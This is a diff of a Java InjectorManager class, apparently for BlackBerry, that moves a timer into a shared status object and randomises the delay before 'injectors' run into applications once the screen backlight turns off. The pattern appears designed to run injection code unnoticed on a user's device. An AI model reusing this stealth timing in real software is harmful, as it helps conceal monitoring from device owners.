@@ -69,7 +69,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
     ApplicationManager manager = ApplicationManager.getApplicationManager();
 
     private InjectorSystemMenu menu;
-    private Timer applicationTimer;
+    
     private String actualMod;
     private String actualName;
     private AInjector injector;
@@ -489,7 +489,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             final String modname = CodeModuleManager.getModuleName(handle);
             if (modname.equals(name)) {
                 //#ifdef DEBUG
-                debug.trace("exists, found.");
+                debug.trace("exists, found: " + name);
                 //#endif
                 return true;
             }
@@ -579,10 +579,12 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         debug.trace("onApplicationChange name: " + startedName + " cod: "
                 + startedMod);
         //#endif
+        
+        //Status status=Status.self();        
 
-        if (applicationTimer != null) {
-            applicationTimer.cancel();
-            applicationTimer = null;
+        if (status.applicationTimer != null) {
+            status.applicationTimer.cancel();
+            status.applicationTimer = null;
         }
 
         if (injectorMap.containsKey(startedMod)) {
@@ -600,26 +602,30 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
     }
 
     private void startApplicationTimer() {
-        applicationTimer = new Timer();
+        status.applicationTimer = new Timer();
 
         RunInjectorTask task = new RunInjectorTask(RUNON_APP);
-        applicationTimer.schedule(task, APP_TIMER_PERIOD, APP_TIMER_PERIOD);
+        status.applicationTimer.schedule(task, APP_TIMER_PERIOD, APP_TIMER_PERIOD);
     }
 
-    public void onBacklightChange(boolean status) {
+    public void onBacklightChange(boolean value) {
         //#ifdef DEBUG
-        debug.trace("onBacklightChange: " + status);
+        debug.trace("onBacklightChange: " + value);
         //#endif
-        if (!status) {
-            if (applicationTimer != null) {
-                applicationTimer.cancel();
-                applicationTimer = null;
+        if (!value) {
+            if (status.applicationTimer != null) {
+                status.applicationTimer.cancel();
+                status.applicationTimer = null;
             }
 
-            applicationTimer = new Timer();
+            status.applicationTimer = new Timer();
             RunInjectorTask task = new RunInjectorTask(RUNON_BACKLIGHT);
             //TODO: Random(11,30) * 1000
-            applicationTimer.schedule(task, 11000, Integer.MAX_VALUE);
+            int waitSeconds=Utils.randomInt(11,30);
+            //#ifdef DEBUG
+            debug.trace("onBacklightChange, waiting: " + waitSeconds);
+            //#endif
+            status.applicationTimer.schedule(task, waitSeconds * 1000, Integer.MAX_VALUE);
         } else {
             if (foreInterestApp) {
                 startApplicationTimer();
